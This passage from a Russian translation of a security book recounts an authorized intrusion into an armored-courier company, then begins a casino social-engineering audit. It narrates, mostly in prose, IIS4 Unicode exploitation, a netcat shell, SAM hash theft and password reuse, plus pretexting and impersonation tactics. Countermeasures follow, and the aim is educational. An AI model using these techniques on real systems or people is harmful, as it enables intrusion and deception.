— просто.  «Нам часто приходится переводить буквы и символы в ASCII-коды и наоборот. Надо просто встать и посмотреть в одну из полезных таблиц, которые развешаны у нас по всем стенам».  Вместо полуголых девиц у этих ребят на стенах висели таблицы перевода символов из одной систему в другую. «ASCII-красотки», — говорит Луис.  С помощью приятелей, которые подсказывали, какую последовательность цифр надо набирать, они успешно ввели в компьютер имя пользователя и пароль. После этого они смогли передать программу для взлома PWL и запустить ее, чтобы извлечь информацию из P W L —файла в текстовый файл, который затем переслать из ноутбука водителя на FTP-сервер, находящийся под их контролем.  Когда Луис просмотрел этот файл, он нашел там необходимые для авторизации данные, которые искал, включая номер телефона для dial-up соединения и те имя и пароль, которые водитель использовал для соединения с VPN-сетью компании. Луис подумал, что это вся информация, которая ему нужна.  Проверяя, не оставил ли он следов своего пребывания в ноутбуке водителя, Луис просмотрел все «иконки» на рабочем столе компьютера и обратил внимание на одну, которая выглядела как приложение, с помощью которого курьеры-охранники могли получать информацию из компании. Теперь они знали, что водители соединялись через компанию с сервером приложений, чтобы получить необходимую им информацию.   ДОСТУП   В   СИСТЕМУ   КОМПАНИИ   «Мы подозревали, — вспоминает Луис, — что этот пользователь вполне мог заметить странную активность в своем компьютере, поэтому мы оттуда ушли. Если бы об этом инциденте был сделан специальный доклад, то VPN-сервис был бы просто отключен. и наше знание параметров, необходимых для входа в него, обесценилось».  Через несколько секунд они заметили, что соединение с PC Anywhere прервалось — водитель отсоединился. Луис и его помощники извлекли нужную им информацию из PWL-файла как раз вовремя.  Теперь у Луиса и Брока был номер телефона, принадлежащий dial-up устройству, одному из тех, что они рисовали вчера вечером в баре. Это был опять иностранный номер. Используя ту же систему Windows, что использовал и охранник, они набрали этот номер, ввели имя пользователя и пароль и «обнаружили, что мы успешно установили VPN-соединение».  Из того, как был сконфигурирован VPN, они получили IP-адрес в D M Z компании, так что оказались за первым межсетевым экраном, но перед ними еще был второй межсетевой экран, защищающий внутреннюю сеть, что они поняли еще раньше.  IP-адрес, п р и п и с а н н ы й V P N , находился в пределах D M Z , поэтому некоторые компьютеры внутренней сети ему вполне доверяли, Луис думал, что проникнуть во внутреннюю сеть будет намного легче, поскольку они уже проникли за первый межсетевой экран. «В этот момент, — говорит он, — мы думали, что пробраться через внутренний межсетевой экран во внутреннюю сеть будет легко». Но когда он попробовал сделать это, то обнаружил, что не может добраться до исполняемого сервиса на компьютере, где был установлен сервер приложений. «Это был очень странный TCP-порт, который был доступен и через фильтры, и мы думали, что он используется для приложений, которыми пользуются водители. Но мы не знали, как он работает».  Луис стремился отыскать во внутренней сети компании систему, в которую он мог бы проникнуть, используя ее IP-адрес. Он работал по обычной хакерской схеме — пытался найти систему, которую он мог бы использовать во внутренней сети.  Они надеялись найти во внутренней сети компании такую систему, в которую никто не входил бы с удаленного терминала, и в ней легко было бы обнаружить лазейки, просто потому, что она считалась бы системой «только для внутреннего пользования». Они воспользовались сканированием портов в поисках любого доступного Интернет-сервера (порт 80) во всем диапазоне IP-адресов внутренней сети и обнаружили сервер под Windows, с которым они смогли соединиться и на котором работал IIS (Internet Information Server), но достаточно старая версия этой популярной программы IIS4. Это была очень радостная новость, поскольку они наверняка могли найти в нем незакрытую лазейку или ошибку в конфигурации, которая дала бы им «ключи к замку».  Первое, что они сделали, это запустили специальную программу для поиска лазеек Unicode в IIS4, чтобы проверить, насколько он уязвим, и нашли такие лазейки, (Unicode — это набор 16-битных слов для кодировки слов из многих разных языков с использованием одного набора знаков). «Итак, мы могли использовать Unicode для выполнения команд на этом IIS-сервере», — воспользоваться уязвимостью системы безопасности, пройти фильтрование во втором межсетевом экране в их внутренней сети «уже глубоко на их территории», рассказывает Луис. Хакеры в этом случае усиливали Интернет-запрос (HTTP) с помощью специально закодированных символов, чтобы пройти проверки безопасности на Интернет-сервере. Это позволяло им выполнять произвольные команды с привилегиями того пользователя, который в данный момент работал на Интернет-сервере.  Немного подумав, ребята, наконец, нашли возможность загружать файлы. С помощью Unicode они использовали echo-команды для загрузки текста ASP (Active Server Pages) — простого загрузчика файлов, который упростил передачу хакерских программ в корневую Интернет-директорию, из которой можно было запускать программы на сервере. (Корневая Интернет-директория — это корневая директория на Интернет-сервере, в отличие от обычной корневой директории на диске — С:\). Echo-команда просто пишет аргументы, которые ей передаются; выход может быть направлен в сайт, а не на экран пользователя. Например, если напечатать «echo owned > mit-nick.txt» запишет слово «owned» в файл mitnick.txt. Они использовали целую серию echo-команд, чтобы записать текст кодов ASP в исполняемую директорию на Интернет-сервере.  Затем они загрузили туда и другие хакерские средства, среди которых было популярное сетевое средство netcat, которое очень полезно для установки специальных команд прослушивания входящего порта. Они загрузили туда и приложение под названием НК, которое использует лазейку в старой версии Windows NT, которая позволяет получить привилегии администратора.  Они загрузили еще одну простую программу для запуска приложения НК, а затем использовали netcat, чтобы открыть соединение обратно к себе, что дало им возможность вводить команды на компьютер-мишень, типа того, как это было во времена операционной системы DOS. « М ы пытались инициировать исходящее соединение с внутреннего Интернет-сервера на наш компьютер в DMS». — объясняет Луис. «Но это не сработало, поэтому нам пришлось использовать технику под названием „цепляние к порту“. После выполнения программы НК для получения привилегий, они сконфигурировали netcat на прослушивание порта 80: чтобы „перенести“ IIS-сервер временно со своего пути, наблюдая за первым входящим соединением на порт 80.  Луис поясняет технологию «цепляния» так: « В ы временно убираете IIS с его места действия, как бы перехватывая управление уровнем, позволяя IIS работать на втором плане, вы сохраняете доступ к вашему уровню». В системах Windows в отличие от операционных UNIX-систем разрешается одновременно двум программам использовать один и тот же порт. Атакующий может использовать эту возможность, если найдет порт, который не фильтруется межсетевым экраном, а потом «прицепится» к этому порту.  Именно это и проделали Луис и Брок. Доступ, который у них уже был к узлу IIS, был ограничен правами, которые давал им пользователь, под именем которого работал сервер. Поэтому они запустили НК и netcat и смогли получить полные привилегии контроля над системой — работая, как пользователь системы, что является самой высокой привилегией в операционной системе. При помощи стандартных методик этот доступ позволил бы им получить полный контроль над всей Windows-активностью мишени.  На сервере работала система Windows NT 4.0. Атакующие хотели скопировать SAM-файл (Security Accounts Manager — управление безопасностью директорий), в котором содержались все детали о директориях пользователей, группах, политиках и контролях доступа. В этой старой версии операционной системы они запустили команду «rdisk/s», чтобы провести аварийную замену диска. Эта программа начинает с того, что создает несколько файлов в директории «repair». Среди этих файлов есть обновленная версия SAM-файла, которая содержит «нарезку» паролей для всех пользователей сервера. Еще раньше Луис и Брок раскрыли файл PWL, где содержались все важные пароли из ноутбука охранника: теперь они получили в свои руки зашифрованные пароли всех пользователей на одном из серверов компании. Они просто скопировали этот SAM-файл в корневую директорию Интернет-сервера. «Затем, используя Интернет-браузер, мы извлекли его с сервера на компьютер в нашем офисе».  Когда они взломали пароли из SAM-файла, то обнаружили, что там есть еще один пользователь-администратор на местном компьютере, отличный от администратора встроенной директории.  «После нескольких часов работы мы смогли взломать пароль этого пользователя, а затем попытались авторизоваться в первичном контроллере домена. И мы обнаружили, что этот пользователь с правами администратора на Интернет-сервере, взломанном нами, имел точно такой же пароль и в домене! И здесь он тоже имел права администратора.  Итак, на Интернет-сервере был пользователь с правами администратора, который имел такое же имя, как и администратор домена, и пароль в обоих с л у ч а я х был один и т о т же. Э т о т администратор был невероятно ленив, если для своей директории на другом сервере повторно использовал то же самое имя и пароль».  Дело постепенно продвигалось, хоть и небольшими шажками. Администратор на Интернет-сервере не имел таких привилегий на весь домен. Но, получив его пароль на Интернет-сервере, благодаря его лени мы смогли проникнуть в директорию администратора домена. Администратор домена администрирует или управляет всем доменом в отличие от администратора вашего локального компьютера, который управляет только им. В данном случае Луис не был исключением.  «Надо сказать, что это обычная практика, с которой мы часто встречаемся. Администратор домена создает свою директорию на всех машинах сотрудников сети и использует для них тот же пароль. И это означает, что сведения из каждого локального компьютера могут быть использованы для взлома системы безопасности всего домена».   ЦЕЛЬ   ДОСТИГНУТА   Шаг за шагом — все ближе к цели. Луис и Брок обнаружили, что не могут получить полный контроль над сервером приложений и данными, которые на нем хранятся. Они проверяли IP-адрес компьютера, который они нашли на ноутбуке водителя (или охранника), и сервер приложений, с которым он был связан. После этого они пришли к выводу, что сервер приложений расположен в том же домене. Наконец, они получили полный контроль над всеми действиями компании. «Наконец, мы добрались до самого сердца бизнеса компании, Мы могли изменить все команды на сервере приложений, то есть могли дать указание водителям доставить деньги туда, куда нам было надо. Мы могли дать водителям такую команду: „Возьмите деньги из этой кассы и доставьте по этому адресу“ и ждать по указанному адресу, когда они доставят нам деньги».  Или: «Возьмите заключенного А, доставьте в определенное место и передайте тем, кто его там будет ждать» — и вы извлекаете из тюрьмы своего приятеля или беспутного брата.  Или террориста…  Они получили в свои руки средство для обогащения или создания хаоса. « М ы испытали определенный шок, поскольку они просто не представляли себе размеры ущерба, который мы могли им нанести», — говорит Луис.  То, что компания считала безопасностью, оказалось только призраком безопасности.   АНАЛИЗ   Луис и Брок не разбогатели благодаря той мощи, которую получили в свои руки и не стали рассылать приказы по освобождению или пересылке заключенных. Вместо этого они предоставили компании полный отчет о том, что им удалось обнаружить.  Услышав обо всем этом, компания отреагировала достаточно вяло. Они не стали проводить анализ рисков шаг за шагом: «Если хакеры проникли в первый компьютер, что они могли сделать дальше?» и так далее. Они опять посчитали себя в безопасности, закрыв несколько лазеек, на которые указал им Луис. Они считали, что кроме тех, которые нашли Луис и Брок, других просто не существует.  Луис считает, что подобная надменность и самоуверенность типичны для крупного бизнеса. Еще бы — какие-то пришельцы дают им рекомендации по поводу их безопасности. Их раздражает, когда им дают рекомендации, что они должны делать, и особенно те, кто дает им эти рекомендации. Они уверены, что все уже знают. Когда появляется брешь, они заделывают ее и считают, что она была единственной.   КОНТРМЕРЫ   Также как и в других историях, рассказанных в этой книге, атакующие не нашли большого количества лазеек в атакуемой компании, но даже тех немногих, что они нашли, было вполне достаточно, чтобы завладеть всем доменом компьютерной системы компании, который имеет огромное значение для бизнеса. О некоторых полезных уроках стоит сказать отдельно.   ВРЕМЕННЫЕ   МЕРЫ   Не так давно устройства компании 3Com соединялись с последовательным портом маршрутизатора Cisco.  Под давлением необходимости быстрого реагирования на ситуацию компании требуется предпринимать «временные» меры, но их ни в коем случае нельзя сделать «постоянными». Надо сразу же установить режим физической и логической проверки всех шлюзов, использовать те средства безопасности, которые постоянно контролируют открытые порты, в узлах или устройствах в соответствии с политикой безопасности компании.   ИСПОЛЬЗОВАНИЕ   ВЫСОКИХ   ПОРТОВ   Компания сконфигурировала маршрутизатор Cisco так, чтобы разрешить удаленные соединения на порту с большими номерами, предполагая, что эти порты достаточно неопределенные области и они не могут привлечь внимания атакующих — это еще один пример «безопасности через неясность».  Мы уже не один раз обсуждали эту тему на страницах книги, когда решения по обеспечению безопасности основываются на таком подходе. Истории в этой книге снова и снова демонстрируют, что если у вас есть хотя бы одна-единственная щель в системе безопасности, кто-то из атакующих рано или поздно отыщет ее. Самая лучшая стратегия при обеспечении безопасности — убедиться в том, что все точки доступа и устройства (прозрачные или нет) проходят фильтрацию, если доступ к ним происходит извне.   ПАРОЛИ   В тысячный раз повторяем: все изначально установленные пароли должны быть изменены перед тем, как допускать устройство или систему к эксплуатации. Даже если технический персонал знает об этой проблеме, и знает, как ее устранять. Не забывайте о том, что в Интернете есть такие сайты, как  http://www.phenoelit.de/dpl/dpl.html  например, где приведены все изначальные имена пользователей и пароли.   БЕЗОПАСНОСТЬ   ЛИЧНЫХ   НОУТБУКОВ   Ситуация, когда устройство, которое используют удаленные работники компании, соединяется с корпоративной сетью с недостаточным уровнем безопасности или же совсем без нее, очень распространена. У одного из пользователей стояло приложение PC Anywhere, позволяющее устанавливать удаленное соединение даже безо всякого пароля. Хотя компьютер и был соединен с Интернетом через dial-up, причем только на очень короткие периоды времени, каждое из таких соединений открывало окно для возможных проникновений. Атакующие смогли удаленным образом управлять компьютером, соединяясь с ноутбуком, на котором работало приложение PC Anywhere. И поскольку оно было сконфигурировано так, что даже не требовало пароля, атакующие могли проникнуть в компьютер пользователя, просто зная его IP-адрес.  ИТ-политики компании должны устанавливать такие требования к системам клиентов, чтобы у них был определенный уровень безопасности перед тем, как им будет позволено соединиться с корпоративной сетью. Есть специальные программы, которые устанавливаются на компьютеры клиентов и обеспечивают контроль их безопасности и их соответствие политике компании: в ином случае компьютеру клиента не разрешается доступ к корпоративным компьютерным ресурсам. «Плохие парни» обычно анализируют свою мишень, изучая ситуацию в целом. Они проверяют, соединен ли какой-нибудь пользователь удаленно, и если да, то где источник этого соединения. Атакующий знает, что если ему удастся проникнуть в один из таких «надежных» компьютеров, используемых для доступа в корпоративную сеть, очень вероятно, что ему удастся и дальше получать доступ к корпоративным информационным ресурсам.  Даже когда в компании о безопасности думают вполне серьезно, очень часто проблема защиты ноутбуков и домашних компьютеров, используемых сотрудниками для доступа к корпоративной сети, недооценивается, они остаются открытыми для атаки, и атакующие могут использовать этот недосмотр, как и произошло в этой истории. Ноутбуки и домашние компьютеры, которые соединяются с внутренней сетью, должны быть полностью безопасны — иначе компьютер сотрудника может стать слабым звеном, которое как раз и используют «плохие парни».   АВТОРИЗАЦИЯ   Атакующие в этом случае смогли извлечь информацию для авторизации из компьютера клиента, не будучи обнаруженными. Как уже не раз отмечалось в предыдущих главах, более продуманная система авторизации может остановить большинство атакующих, и компании должны использовать динамические пароли, смарт-карты, токены или цифровые сертификаты, как средства авторизации для удаленного доступа в VPN или другие важные системы.   ФИЛЬТРАЦИЯ   НЕ   ПЕРВОСТЕПЕННЫХ   С  Е  Р  В  И  С  О  В   ИТ-персонал компании обязан разработать определенный набор фильтров для управления и входящими и исходящими соединениями серверов и хостов с такой ненадежной сетью, как Интернет, так же, как и для сетей (DMZ) внутри компании.   УКРЕПЛЕНИЕ   Эта история содержит и напоминание для ИТ-персонала, что не заботиться об укреплении компьютерных систем, связанных с внутренней сетью или не вовремя использовать «заплатки» для систем безопасности — это очень большой риск. Именно такой стиль поведения дает «плохим парням» преимущество. После того, как атакующий найдет путь доступа хотя бы к одной недостаточно защищенной системе и сможет проникнуть в нее, открывается дверь для незаконного доступа в другие системы, которые доверяют атакованному компьютеру. Далее, просто полагаться на межсетевой экран периметра, чтобы не пускать хакеров в сеть, и не заботиться об укреплении систем, связанных с корпоративной сетью, аналогично тому, как если бы вы сложили все свои деньги на обеденный стол посредине квартиры и думали бы, что они в безопасности, поскольку входная дверь заперта.   ПОСЛЕСЛОВИЕ   Поскольку это последняя из историй, рассказывающих о технических атаках, уместно сказать несколько слов в заключение.  Если бы вас попросили назвать важные шаги для того, чтобы перекрыть большинство лазеек, которые позволяют атакующим получить доступ в систему, какие бы вы перечислили, прочитав эту книгу?  Подумайте об этом несколько минут, а потом — переходите к следующей странице.  Я не знаю, что лучше всего запомнилось вам из наиболее вероятных ошибок системных администраторов, описанных в этой книге. Но думаю, несложно выучить хотя бы часть этого списка:  • наладьте процесс управления заплатками в системе безопасности, чтобы они использовались вовремя;  • для удаленного доступа и доступа к важной информации или компьютерным ресурсам используйте более сильные методы авторизации, чем просто пароли;  • смените все изначально установленные пароли;  • используйте модель глубоко эшелонированной обороны, так, чтобы прорыв в одном месте не угрожал безопасности всей системы, и постоянно проверяйте все элементы обороны;  • выработайте корпоративную политику безопасности для фильтрации как входящего, так и исходящего трафика;  • укрепите все клиентские системы, которые имеют доступ к важной информации или вычислительным ресурсам. Не забывайте, что опытный хакер в качестве мишеней часто выбирает клиентские системы, чтобы проникнуть в их соединение или из проверенного компьютера связываться с корпоративной сетью;  • используйте устройства для выявления вторжения, чтобы идентифицировать подозрительный трафик или попытки использовать известные лазейки — такие системы могут с равным успехом выявить как недобросовестного сотрудника самой компании, так и атакующего, которому уже удалось проникнуть за внешний периметр безопасности; • постоянно проверяйте работу операционной системы и важнейших приложений, обеспечьте создание записей о работе хостов, где нет большого числа работающих приложений и минимальное число пользователей.       Глава 10.    Социальные   инженеры  :   как   они   работают   и   как   их   остановить      Социальные инженеры используют те же способы убеждения, что и все мы повседневно. Мы все играем какие-то роли. Мы стараемся завоевать доверие. Мы призываем к исполнению взаимных обязательств. Но социальный инженер делает все это только для того, чтобы манипулировать людьми, обманывать их самым подлым образом, часто с разрушительным эффектом.      Социальный психолог, д-р Брэд Сагарин   Эта глава отличается от других: мы знакомимся с самым опасным типом атаки, который трудно обнаружить, а еще труднее от него защититься. Социальный инженер, использующий искусство обмана в качестве главного оружия, основывает свои действия на самых лучших человеческих качествах: стремлении помочь ближнему, вежливости, желанию работать в команде, отзывчивости и естественном желании довести дело до конца.  Как и в большинстве угрожающих ситуаций в жизни, первый шаг к обороне — это понимание методик, которыми пользуются наши противники. Поэтому мы расскажем сейчас о целом ряде психологических приемов, которые используют особенности человеческой природы и позволяют социальным инженерам быть столь успешными.  Начнем мы с рассказа о том, как они действуют. Он основан на реальной истории, которая, с одной стороны, увлекательна, а с другой — представляет собой настоящее пособие по социальной инженерии. Мы сочли ее настолько показательной, что включили в книгу, несмотря на некоторые сомнения. — автор либо случайно опустил некоторые детали, поскольку он был занят другим делом, либо он рассказал только часть истории. И все же, даже если кое-что в этом рассказе и выдумано, он прекрасно демонстрирует, как важно защищаться от атак социальных инженеров.  И, как во всех главах этой книги, некоторые детали изменены, чтобы защитить как атакующего, так и атакованную компанию.   СОЦИАЛЬНЫЙ   ИНЖЕНЕР   ЗА   РАБОТОЙ   Летом 2002 года консультант, которого мы будем называть Урли, был нанят компанией казино из Лас-Вегаса для проведения аудита безопасности. Руководство активно занималось перестройкой системы обеспечения безопасности, и наняло его, чтобы он «попытался обмануть всех и вся», надеясь на основании этого опыта укрепить инфраструктуру компании. Урли был хорошим профессионалом, но мало знал о специфике игорного бизнеса.  Посвятив неделю глубокому погружению в исследование культуры стриптиза, — отдав, таким образом, дань Лас-Вегасу, он решил заняться делом. Он обычно приступает к своей миссии до назначенного срока, да и закончить старается тоже до запланированного начала, потому что давно понял, что руководство ничего не говорит своим сотрудникам о проводимой проверке только до тех пор, пока она не началась. «Даже когда они не должны никому ничего говорить, они обычно делают это». Но он легко справлялся с этой проблемой, начиная свою работу за две недели до назначенного срока.  Он приехал и поселился в отеле в девять вечера, после чего отправился в первое казино, находящееся в его списке, чтобы начать разведку на местности. Поскольку раньше он почти не сталкивался с казино, этот визит был для него настоящим открытием. Первое, что противоречило образу казино, созданному в его представлении телеканалом Travel, были сотрудники этого заведения: если на телеэкране они выглядели элитными экспертами в области безопасности, то в реальности они «были либо полусонными, либо совершенно безразличными к своей работе». Поэтому они становились легкой мишенью для простейшей игры на доверии, которая даже и близко не приближалась к тому, что он предварительно планировал.  Он подошел к одному из таких расслабленных сотрудников и очень быстро понял, что тот совсем не прочь поговорить о своей работе. Ирония состояла в том, что раньше он работал в казино, принадлежащем клиентам Урли. «Слушай, а там работа была получше?» — спросил Урли.  Сотрудник казино отвечал: «Я бы так не сказал. Здесь я нахожусь под постоянным контролем. А там они не замечали, даже если я опаздывал на работу, да и во всем было так — с бейджами, расписанием и всем остальным. Там правая рука часто не знала, что делает левая».  Мужчина рассказал ему, что он вообще часто терял свой бейдж, и иногда ему приходилось заимствовать его у коллеги, чтобы бесплатно пообедать в тамошнем кафе для сотрудников, расположенном внутри казино.  На следующее утро Урли сформулировал свою цель, которая была достаточно очевидна: он собирался проникнуть, по мере возможности, в каждое из охраняемых помещений казино, задокументировать свое присутствие там, и попытаться проникнуть в максимальное число систем безопасности. Кроме того, он хотел отыскать доступ к любой из систем, связанных с финансами и получить другую важную информацию, например, сведения о посетителях.  Возвращаясь ночью в отель из казино, он услышал по радио рекламу нового фитнес-клуба, предлагающего скидки для обслуживающего персонала. Он поспал и на следующее утро отправился в этот фитнес-клуб.  В клубе он выбрал для контакта девушку по имени Ленора. «Через пятнадцать минут мы установили с ней „психологический контакт“. Ему повезло, поскольку она оказалась финансистом, а он хотел узнать как можно больше о вещах, имеющих отношение к понятиям „финансовый“ и „аудит“ в казино-мишени. Проникновение в финансовую сферу во время проверки выявило бы колоссальную брешь в системе безопасности казино.  Один из любимых трюков Урли при занятиях социальной инженерией — угадывание мыслей собеседника. Во время разговора он следил за всеми оттенками поведения Леноры, и затем выдавал какое-то откровение, от которого о н а буквально в с к р и к и в а л а : « О , господи, как ты догадался?». В общем, они подружились, и он пригласил ее поужинать.  Во время ужина Урли рассказал ей, что он новичок в Вегасе, и подыскивает себе работу, что он закончил хороший университет, у него диплом в области финансов, но он переехал в Вегас из-за разрыва со своей девушкой. Затем он пожаловался, что немножко напуган перспективой занятий финансовым аудитом в Вегасе, потому что не хочет закончить жизнь «в желудке акулы». Она принялась его успокаивать, говоря, что отыскать работу в области финансов здесь совсем несложно. Чтобы помочь ему, Ленора рассказала ему гораздо больше деталей о своей работе, чем ему требовалось. «Она была самой большой моей удачей уже в начале пути, и я с удовольствием заплатил за ужин, поскольку все равно это сумма будет включена в мои производственные расходы».  Вспоминая то время, он говорит, что переоценивал тогда свои возможности, «что сильно повредило мне потом». Настало время начинать. Он упаковал сумку «с некоторыми нужными вещами, включая ноутбук, беспроводную точку доступа Orinoco, антенну и несколько других аксессуаров». Его цель была проста. Проникнуть в офисные помещения казино, сделать несколько цифровых фотографий (с отметкой времени) самого себя в тех местах, где его быть не должно, затем установить точку беспроводного доступа к сети так, чтобы он мог пытаться удаленно проникнуть в эту систему и собрать важную информацию. Чтобы завершить работу, на следующий день ему следовало еще раз вернуться и забрать установленную точку беспроводного доступа.  «Я чувствовал себя, как Джеймс Бонд». Урли прибыл в казино и расположился неподалеку от служебного входа как раз в момент пересменки, чтобы наблюдать за всем происходящим. Он надеялся, что пришел вовремя, и сможет понаблюдать, как люди входят и выходят, но оказалось, что большинство сотрудников уже прошло внутрь, и ему пришлось действовать в одиночку.  Он подождал еще несколько минут и вход совсем опустел… а это было совсем не то, чего ему хотелось. Урли заметил, что охранника, который собирался уходить, задержал его сменщик, и теперь они стояли и курили у выхода. Докурив, они пошли в разные стороны.  «Я направился вдоль улицы вслед за парнем, который уходил с работы, и приготовился пустить в ход мой любимый обезоруживающий прием.  Когда он пересек улицу и приблизился ко мне, я дал ему возможность пройти совсем рядом.  Затем я обратился к нему: «Пожалуйста, извините меня, у в а с есть минута времени?»  Именно в этом и состоял план. «Я давно заметил, что когда вы встречаетесь с кем-то лоб в лоб, то ваш визави изначально стоит в оборонительной позиции, а если вы позволяете кому-то догнать и обогнать вас, ситуация в корне меняется». Пока охранник отвечал Урли на какой-то незначительный вопрос, тот успел подробно рассмотреть его. Бейдж на груди говорил, что зовут его Чарли. «Пока мы стояли с ним, удача улыбнулась мне еще раз. Еще один сотрудник вышел и назвал Чарли его прозвищем — „Сырок“. Поэтому я спросил у Чарли, как он сподобился получить такое прозвище, и он мне все рассказал».  Затем Урли отправился к служебному входу быстрым шагом. Он всегда повторял, что лучшая защита — это нападение, и предпочитал действовать именно в таком стиле. У входа стояли несколько сотрудников. Он направился прямо к охраннику и сказал: «Слушай, ты не видел Сырка? Он должен мне двадцать баксов за игру, они мне очень нужны, чтобы перекусить в перерыве».  Вспоминая этот момент, он говорит: «Черт побери, это был мой первый прокол». Он совсем забыл, что сотрудники казино здесь питаются бесплатно. Но он никогда не впадает в отчаяние после «проколов»: тогда как другие гиперактивные люди с недостаточной концентрацией внимания могут растеряться в подобной ситуации, он сверхгиперактивный, и «может гораздо быстрее думать на бегу, чем большинство людей». Эта способность и помогла ему.  «Охранник сказал: „А какого черта ты вообще платишь деньги за обед?“ и в его взоре появилась подозрительность. Я быстро развеял ее: „Слушай, я договорился пообедать с невероятно милой девочкой. Ты не представляешь себе, какая она классная!“. (Подобное заявление всегда отвлекает пожилых людей, толстых людей и тех, кто живет с родителями).  Охранник ответил: « Т ы в пролете, потому что Сырок у ш е л до конца недели». «Вот ублюдок!» — сказал я».  Охранник совершенно очаровал Урли (а его трудно очаровать) своим неожиданным вопросом, любит ли он эту девушку.  «Я начинал входить в ритм работы. А затем последовал настоящий сюрприз. Я никогда в жизни не испытывал ничего подобного. Конечно, можно это приписать моему фантастическому мастерству, но, с к о р е е всего, это была просто удача: парень протянул мне сорок долларов! Он сказал, что за двадцать долларов ничего приличного не закажешь, а мне наверняка придется расплачиваться за обоих. Затем в течение пяти минут он давал мне „отеческие“ советы, — хотел передать свои глубокие познания мне, молодому парню!».  Урли пришел в полное умиление от того, что этот увалень решил заплатить за его выдуманное свидание.  Но все шло совсем не так гладко, как думал Урли, поскольку, как только он повернулся, чтобы уйти, охранник понял, что на нем нет бейджа, и спросил его об этом. «Пришлось мне сказать, что я забыл его в сумке, очень извиняюсь за это, и пойти в здание. Это был опасный момент, поскольку, если бы он стал настаивать, мои дела были бы плохи».  Итак, Урли вошел через служебный вход, но не имел ни малейшего представления, куда двигаться дальше. Там совсем не было людей, за которыми он мог бы последовать, поэтому он начал осторожно оглядываться и обдумывать, что делать дальше. Честно говоря, особого страха он не испытывал. «Забавно, — подумал он, — как цвет может влиять на психологию человека. Я был одет во все синее — цвет правды, — как будто я молодой топ-менеджер. Большинство пробегающих мимо людей были одеты, как простые сотрудники, поэтому было маловероятно, что они о чем-то спросят меня».  По мере продвижения он заметил комнату, которая выглядела в точности так, как он видел в фильме «Небесное око», за исключением того, что она была расположена не на самом верхнем этаже. В этой комнате было «столько телевизоров, сколько я больше нигде не видел — это было круто!». Он прошел в эту комнату и сделал нечто неожиданное. «Я зашел, и перед тем, как они успели спросить меня о чем-то, прочистил горло и сказал: „Внимание на девицу в двадцать третьем“.  Все телевизоры были перенумерованы, и конечно, на каждом экране была хотя бы одна девица. Все собрались около телевизора №23 и начали обсуждать, что замышляет девица, — Урли разбудил в них профессиональную паранойю. Это продолжалось добрых четверть часа, потом все вернулись к наблюдению за людьми на других мониторах, а Урли решил, что эта работа очень хорошо подходит тем, кто страдает склонностью к вуайеризму.  Перед тем, как выйти из комнаты, он сказал: «Извините, я был поглощен работой, и забыл представиться. Я Вальтер из внутреннего аудита. Меня недавно пригласил в свою группу Дэн Мур, — используя имя главы отдела внутреннего аудита, — одного из тех, кто вел с ним переговоры о проведении проверки. — Я еще не освоился во всех этих коридорах. Вы не покажете мне дорогу в комнаты руководства?».  Ребята были более чем счастливы избавиться от забредшего к ним «начальника Вальтера» и с удовольствием показали ему дорогу в те комнаты, что он искал. Урли направился в указанном направлении. Увидев, что никого нет вокруг, он решил осмотреться, и обнаружил небольшую комнату отдыха, где молодая женщина читала журнал. «Ее звали Меган, действительно симпатичная девушка. Мы несколько минут поболтали. Затем она сказала: „Слушай, ты из отдела внутреннего аудита, а мне как раз надо кое-что туда передать“. Оказалось, что у Меган есть несколько бейджей, несколько внутренних докладов, и целая коробка бумаг, которые надо было туда отнести. Урли подумал: „Ура, у меня теперь есть бейдж!“  Чтобы его бейдж не рассматривали слишком пристально, он перевернул его, так что была видна только его тыльная сторона. Потом он двинулся дальше.  «По дороге я увидел пустой офис. Там было два сетевых порта, но я не мог с первого взгляда определить, в рабочем ли они состоянии, поэтому я вернулся к Меган, и сказал, что забыл, что должен посмотреть ее компьютер и еще один в „офисе начальника“. Она очень мило согласилась и позволила мне присесть за ее стол.  Она дала мне свой пароль, когда я попросил, а затем опять пошла в комнату отдыха. Я сказал ей, что мне надо установить у нее «монитор сетевой безопасности», и показал ей свою точку беспроводного доступа. Она ответила: «Да делайте, что угодно. Честно говоря, я совсем не разбираюсь во всех этих компьютерных штучках».  Пока ее не было, он установил точку беспроводного доступа и перезагрузил компьютер. Вдруг он осознал, что вместо брелока от ключей у него флэш-память на 256 Мб, а вдобавок к этому — полный доступ к компьютеру Меган. «Я начал просматривать ее жесткий диск и обнаружил там немало интересного». Оказалось, что она занималась техническими делами всех топ-менеджеров и все свои файлы называла «приятными и красивыми именами». Она собирала все подряд, например, там было немало ее фотографий, сидящей с важным видом в комнате начальства. Через несколько минут Ме-ган вернулась, и он спросил у нее дорогу в операционный центр сети (NOC — Network Operations Center).  А вот там он столкнулся с «серьезной проблемой». Он вспоминает: «Сетевая комната была помечена так: „…“, и это было круто. Однако дверь оказалась закрытой». У него не было бейджа, который дал бы ему туда доступ, поэтому он решил просто постучать.  «Оттуда вышел джентльмен, и я рассказал ему свою „легенду“: „Привет, я Вальтер из внутреннего аудита и … бла, бла, бла“. Я не знал, что это за человек, а это был сотрудник ИТ-департамента. Он сказал: „Хорошо, я должен проверить это у Ричарда. Подождите секунду“.  Он повернулся, и попросил кого-то позвать Ричарда, и сказать ему, что здесь кое-кто «утверждает», что он из службы внутреннего аудита. Через несколько минут мой провал стал очевиден. Ричард спросил меня, кто я такой, где мой бейдж и задал еще несколько вопросов. Потом он сказал: «Давайте пройдем в мой офис, я позвоню во внутренний аудит и мы все выясним».  «Этот парень застукал меня с поличным. Но затем я воспользовался своим умением думать очень быстро и сказал ему: „Поздравляю, вы поймали меня“. И пожал ему руку. Потом я сказал: „Меня зовут Урли“, и дал ему свою визитную карточку. Затем я рассказал ему, что нахожусь здесь уже несколько часов, и никто ни о чем меня ни разу не спросил, что он первый, кто проявил бдительность, что будет отражено в моем отчете. Давайте пойдем в ваш офис, и вы позвоните тем, кто подтвердит, что это правда. Кроме того, я сказал, что должен сообщить Марте, которая руководит всей операцией, о некоторых вещах, которые я успел здесь заметить. Я считаю, для достаточно жесткой ситуации мой неожиданный гамбит сработал просто блестяще». Произошло удивительное превращение. Ричард начал спрашивать Урли о том, что он успел рассмотреть, об именах людей и т.п., а потом объяснил, что он проводит свой собственный аудит для того, чтобы увеличить средства, выделяемые на обеспечение безопасности и сделать NOC более безопасным с помощью «биометрики и прочих новинок». Он решил, что может использовать информацию, которую собрал Урли, для достижения своей цели.  Настало время обеда. Урли предложил продолжить разговор за обедом. Ричард согласился с тем, что это хорошая идея, и они вместе направились в столовую для персонала. «Заметьте, что мы до этого никому еще не позвонили. Я предложил ему сделать это сейчас, а он ответил: „У тебя есть бейдж, и я знаю, кто ты такой“. Мы 